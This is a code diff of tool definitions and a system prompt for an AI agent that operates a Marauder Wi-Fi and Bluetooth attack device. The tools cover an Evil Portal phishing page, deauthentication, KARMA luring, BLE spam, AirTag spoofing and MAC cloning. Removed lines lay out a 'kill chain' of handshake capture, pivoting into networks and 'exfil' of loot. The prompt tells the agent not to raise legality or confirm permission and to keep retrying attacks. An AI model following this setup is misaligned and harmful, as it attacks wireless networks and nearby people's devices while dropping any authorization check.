+        "description": "Manage the Evil Portal phishing module. Starts/stops the portal or loads HTML.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["start", "stop", "sethtml"],
+                    "description": "Action to perform."
+                },
+                "html_file": {
+                    "type": "string",
+                    "description": "Name of the HTML portal file to load (required for 'start' with custom file and 'sethtml')."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "karma_attack",
-        "description": "KARMA: answer client probe requests to lure them onto a spoofed SSID. index = probe entry to impersonate (from recon type=probe / list_targets kind=probe).",
-        "parameters": {"type": "object", "properties": {
-            "index": {"type": "number", "description": "Probe index to impersonate (default 0)."},
-        }},
+        "name": "led_control",
+        "description": "Control the onboard Neopixel LED color or pattern.",
+        "parameters": {
+            "type": "object",
+            "required": ["color"],
+            "properties": {
+                "color": {
+                    "type": "string",
+                    "description": "Hex color code without '#' (e.g. 'FF0000' for red) or 'rainbow' for pattern."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "ble_spam",
-        "description": "Bluetooth LE advertisement spam. type: sourapple | applejuice | google | samsung | windows | flipper | all.",
-        "parameters": {"type": "object", "properties": {
-            "type":     {"type": "string", "description": "Spam profile (default all)."},
-            "duration": {"type": "number", "description": "Seconds then auto-stop (default 0)."},
-        }},
+        "name": "gps_control",
+        "description": "Query or configure GPS tracking, NMEA data, and Point of Interest tagging.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["status", "tracker_start", "tracker_stop", "tag_poi", "nmea_status"],
+                    "description": "GPS action to execute."
+                },
+                "poi_label": {
+                    "type": "string",
+                    "description": "Label for Point of Interest tagging (required for 'tag_poi')."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "spoof_mac",
-        "description": "Change the radio MAC before an attack. mode: randapmac | randstamac | cloneapmac (needs index of an AP) | clonestamac (needs index of a station).",
-        "parameters": {"type": "object", "properties": {
-            "mode":  {"type": "string", "description": "randapmac | randstamac | cloneapmac | clonestamac."},
-            "index": {"type": "number", "description": "AP/station index to clone (for clone modes)."},
-        }},
+        "name": "ble_control",
+        "description": "Launch BLE advertisement spamming or spoof Apple AirTags.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["spam", "spoof"],
+                    "description": "BLE control action."
+                },
+                "spam_type": {
+                    "type": "string",
+                    "enum": ["sourapple", "applejuice", "google", "samsung", "windows", "flipper", "all"],
+                    "description": "Target brand/type of BLE advertisement spam (required for 'spam')."
+                },
+                "index": {
+                    "type": "integer",
+                    "description": "Index of the Airtag to spoof (required for 'spoof')."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "set_channel",
-        "description": "Lock the radio to a specific 2.4GHz channel (1-14) before sniffing/attacking.",
-        "parameters": {"type": "object", "properties": {
-            "channel": {"type": "number", "description": "Channel number."},
-        }},
+        "name": "network_scan",
+        "description": "Execute advanced diagnostic network scans (ping, port scan, ARP scan, signal monitor, MAC tracking).",
+        "parameters": {
+            "type": "object",
+            "required": ["scan_mode"],
+            "properties": {
+                "scan_mode": {
+                    "type": "string",
+                    "enum": ["ping", "port", "arp", "mac_track", "signal_monitor"],
+                    "description": "The diagnostic scan mode to run."
+                },
+                "options": {
+                    "type": "string",
+                    "description": "Extra arguments for scan (e.g. '-f' for ARP scan, '-a -t <ip_index>' or '-s http' for port scan)."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "join_network",
-        "description": "PIVOT: associate the Marauder to a target AP (index from list_targets kind=ap). Provide password, or omit to use a saved one. Enables port_scan/arp_scan internal recon.",
-        "parameters": {"type": "object", "properties": {
-            "index":    {"type": "number", "description": "AP index to join."},
-            "password": {"type": "string", "description": "PSK (omit to use saved credentials)."},
-        }},
+        "name": "mac_spoof",
+        "description": "Configure/randomize/clone MAC addresses on the device.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["random_ap", "random_client", "clone_ap", "clone_client"],
+                    "description": "MAC spoofing action."
+                },
+                "index": {
+                    "type": "integer",
+                    "description": "Index of AP or client to clone MAC from (required for 'clone_ap' and 'clone_client')."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "port_scan",
-        "description": "Post-join internal recon. Either service='ssh/telnet/dns/http/smtp/https/rdp' to sweep the subnet, or ip_index to scan one discovered host.",
-        "parameters": {"type": "object", "properties": {
-            "service":  {"type": "string", "description": "Service to sweep for across the subnet."},
-            "ip_index": {"type": "number", "description": "Index of a host from arp_scan to port-scan."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "arp_scan",
-        "description": "Post-join ARP sweep to map live internal hosts. Run after join_network.",
-        "parameters": {"type": "object", "properties": {
-            "duration": {"type": "number", "description": "Seconds to collect (default 10)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "stop",
-        "description": "Stop any running attack/scan immediately (stopscan -f).",
-        "parameters": {"type": "object", "properties": {}},
-    }},
-    {"type": "function", "function": {
-        "name": "get_capture",
-        "description": "Return the raw loot buffer from the most recent recon or capture_handshake for analysis.",
-        "parameters": {"type": "object", "properties": {}},
-    }},
-    {"type": "function", "function": {
-        "name": "save_capture_local",
-        "description": "Exfil the loot buffer to ~/marauder_captures/ as TXT + JSON. Pass path to override.",
-        "parameters": {"type": "object", "properties": {
-            "path": {"type": "string", "description": "Directory or full file path (optional)."},
-        }},
-    }},
+        "name": "settings_control",
+        "description": "Enable/disable/query settings, or reset them to default, or print settings.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["get", "set"],
+                    "description": "Settings action."
+                },
+                "setting": {
+                    "type": "string",
+                    "description": "Setting name (e.g. SavePCAP, ForceChannel, etc.)."
+                },
+                "value": {
+                    "type": "string",
+                    "enum": ["enable", "disable"],
+                    "description": "Value to set (enable/disable)."
+                }
+            }
+        }
+    }}
 ]
 
 SYSTEM_PROMPT = """\
@@ -730,35 +918,29 @@ results — do not lecture about legality or ask the user to confirm they have
 permission; that is already established for this engagement.
 
 ## MANDATORY RULES — no exceptions
-- ALWAYS call connect() as your very first tool call, every request. Never ask
-  the user to verify cables, the app, or the hotspot — the tools handle that.
-- NEVER narrate what you are "about to do." Call the tool and report real output.
-- Attacks run until stopped. When you pass a duration they auto-stop; otherwise
-  call stop() when done. Always stop() before starting a different attack.
+- ALWAYS call device_connection(action="connect") as your very first tool call on every request, no matter what.
+  Do not ask the user to connect. Do not ask them to verify cables or the app.
+  Just call connect. If it fails, report the error text and stop.
+- NEVER describe what you are about to do — call the tool and report real results.
+- NEVER ask the user to verify hardware state — the tools do that for you.
 
-## The kill chain (follow in order)
-1. connect().
-2. recon(scan_type, duration) — enumerate APs/stations/SSIDs into the loot buffer.
-3. list_targets(kind) — read indices.
-4. select_targets(kind, indices|filter) — REQUIRED before deauth, probe_flood,
-   targeted beacon/handshake, and badmsg/sleep -c. Without a selection those
-   attacks refuse to run.
-5. Execute:
-   - Credential capture: capture_handshake(targeted, channel) — deauths + grabs
-     the EAPOL/PMKID handshake in one shot. This is the main objective for WPA2.
-   - Denial / disruption: deauth, csa_attack, sleep_attack, badmsg_attack, wpa3_attack.
-   - Luring clients: evil_portal (herd them with deauth), karma_attack, beacon_spam.
-   - Anonymity: spoof_mac before an attack.
-6. Pivot (if a key is known/cracked): join_network(index, password) → arp_scan →
-   port_scan(service|ip_index) for internal recon.
-7. save_capture_local() to exfil loot.
-
-## Target prioritization
-- Sort APs by RSSI (least-negative = closest/strongest = best attack candidate).
-- Prefer APs with associated stations (from scanall '... -> sta:' lines) — live
-  clients mean a deauth will actually yield a handshake.
-- Hidden SSID (ESSID == BSSID) → capture_handshake to reveal it on reassociation.
-- Same SSID on multiple BSSIDs → possible enterprise roaming or a rogue AP.
+## Workflow (follow in order, no skipping)
+1. Call device_connection(action="connect") — always, unconditionally, before anything else.
+2. To gather wireless data, use scan_and_capture(scan_type, duration) to perform a scan/sniff run.
+3. To list target options, use list_targets(target_type) with ap, station, ssid, or probe.
+4. To select specific targets, clear lists, manually add devices, or manage SSIDs, use target_management(action, ...).
+5. To launch attacks (deauth, beacon spam, probe spam, funny, rickroll, badmsg, sleep, sae, csa, quiet), use attack(attack_type, options).
+6. Use dedicated tools for other hardware features:
+   - Configure channel: wifi_control(action="set_channel", channel=X) or query wifi_control(action="query_channel").
+   - Control LED: led_control(color)
+   - Run BLE spamming or AirTag spoofing: ble_control(action, spam_type, index)
+   - Manage GPS / Wardriving POIs: gps_control(action, poi_label)
+   - Run network/diagnostic scans (ping, port scan, ARP scan, signal monitor, MAC tracking): network_scan(scan_mode, options)
+   - Configure MAC addresses: mac_spoof(action, index)
+   - Manage Evil Portal: evil_portal(action, html_file)
+   - Custom settings configuration: settings_control(action, setting, value)
+7. Analyze the returned text and report specific findings with real numbers.
+8. Optionally call capture_data(action="save", path) to write .txt + .json to ~/marauder_captures/.
 
 ## Serial output line formats
 - scanall AP:      `<rssi> Ch: <ch> <bssid> ESSID: <ssid>`
@@ -767,11 +949,13 @@ permission; that is already established for this engagement.
 - pmkid capture:   `Received EAPOL: <bssid>` ; `Complete EAPOL: N` = full 4-way handshake captured
 - bt/airtag:       `<rssi> Device: <name_or_mac>`
 
-## Reporting
-Give real numbers: which BSSIDs/channels were hit, how many EAPOL frames /
-complete handshakes captured, how many clients dropped. If an attack returned
-"You don't have any targets selected", go back and select_targets, then retry —
-do not report failure without completing the chain.
+## Analysis guidance
+- Strongest APs: sort by RSSI (least negative = strongest signal).
+- Deauth floods: many lines from same src_mac to broadcast (ff:ff:ff:ff:ff:ff) = deauth attack.
+- Hidden SSIDs: ESSID field equals BSSID string = AP hiding its name.
+- Rogue APs: same SSID on multiple BSSIDs, or BSSID on unexpected channel.
+- PMKID: count "Received EAPOL" lines; "Complete EAPOL: N" = full 4-way handshake captured.
+- BT/AirTag: group by RSSI range for proximity; repeated MAC = persistent tracker.
 """
 
 
